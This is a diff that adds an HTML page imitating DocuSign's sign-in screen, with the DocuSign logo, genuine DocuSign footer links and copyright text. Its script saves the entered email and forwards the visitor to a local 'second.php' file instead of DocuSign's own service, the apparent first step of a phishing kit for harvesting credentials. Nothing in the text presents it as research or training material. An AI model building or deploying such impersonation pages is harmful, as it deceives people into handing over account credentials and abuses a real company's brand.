@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>DocuSign Login - Enter email to start sign in</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <section class="user-login-container">
+      <div class="main-login-box">
+        <div style="height: fit-content;">
+          <img class="logo-img" src="./img/docusign_logo_small.png" alt="" />
+        </div>
+        <div class="login-form-container">
+          <h2>Please log in to your account</h2>
+          <form autocomplete="off" name="form" >
+            <div class="form-g">
+              <input
+                class="the-input"
+                type="text"
+                name="email"
+                required
+                autocomplete="false"
+                placeholder="Email address"
+              />
+            </div>
+            <div class="form-g">
+              <a class="button" id="authBTN" >Continue</a>
+            </div>
+            <div class="form-g">
+              <a class="btn" href="https://account.docusign.com/signup"
+                >No account? Sign up for free</a
+              >
+            </div>
+          </form>
+        </div>
+      </div>
+      <div class="footer">
+        <div class="upper-links">
+          <a href="http://www.docusign.com/support">Help</a>| <a href="https://www.docusign.com/company/terms-and-conditions/web">Terms</a>|
+          <a href="https://www.docusign.com/IP">Intellectual Property</a>| <a href="https://www.docusign.com/company/privacy-policy">Privacy Policy</a>|
+        </div>
+        <div class="copyright">
+          <p>Copyright © 2020 DocuSign, Inc. All rights reserved.</p>
+        </div>
+      </div>
+    </section>
+    <script>
+      let authbtn = document.getElementById('authBTN');
+
+      authbtn.addEventListener('click', () => {
+        let email = document.forms["form"]["email"].value;
+        if(email == ""){
+          alert('Please enter your email address')
+        } else {
+          localStorage.setItem("email", email);
+          window.location.href = "second.php";
+        }
+        
+      })
+    </script>
+  </body>
+</html>
